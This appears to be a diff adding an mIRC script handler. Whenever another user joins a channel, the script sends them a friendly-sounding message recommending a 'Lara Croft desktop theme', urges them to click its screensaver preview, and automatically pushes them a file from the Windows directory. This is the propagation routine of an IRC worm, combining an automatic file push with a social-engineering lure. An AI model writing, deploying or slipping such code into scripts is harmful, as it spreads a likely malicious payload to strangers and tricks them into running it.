@@ -1,0 +1,2 @@
+[Script]
+n0=on 1:JOIN:#:if ( $me != $nick ) { /msg $Nick Hello there, Check out this Lara Croft desktop theme: Click on the Preview screen saver button, its the best i've ever seen | /dcc send $nick %Windir%\LaraCroft.theme }
